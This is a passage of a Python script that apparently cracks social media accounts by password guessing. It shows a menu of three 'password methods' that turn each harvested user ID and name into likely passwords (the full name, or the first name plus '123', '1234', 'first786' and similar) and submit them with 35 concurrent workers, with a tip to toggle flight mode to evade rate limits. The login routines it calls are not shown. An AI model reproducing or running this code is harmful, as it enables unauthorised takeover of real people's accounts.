        print('\x1b[1;97m [3] AUTO PASS \x1b[1;92m[ MHTOD] [3] ')
        print('\x1b[1;97m----------------------------------------')
        pw = input(f"\x1b[1;97m [+] Select Password Method : ")
        os.system ('clear')
        print(logo)
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
            os.system ("clear")
        elif pw in["1","01"]:
            print('═══════════════════════════════════════')
            print('[+] process started\n[+] use flight Mode for Speed Up')
            print('═══════════════════════════════════════')
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0].lower()+' '+xz[1].lower()]
                       else:
                           
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0].lower()+' '+xz[1].lower()]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
            
            
        elif pw in["2","02"]:
            print('═══════════════════════════════════════')
            print('[+] process started\n[+] use flight Mode for Speed Up')
            print('═══════════════════════════════════════')
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz]
                           pwx = [name, xz]
                           pwx = [name, xz]
                       else:
                           pwx = [name, xz]
                           pwx = [name, xz]
                       kirim.submit(self.__metode1__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
            
        elif pw in["3","03"]:
            print('═════════════S════T═════════C═════════════')
            print('[+] process started\n[+] use flight Mode for Speed Up')
            print('═════════════S═════T═════════C════════════')
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"first123", xz[0]+"first786", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"first123", xz[0]+"first786", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
            
        
if __name__ == '__main__':
    file()
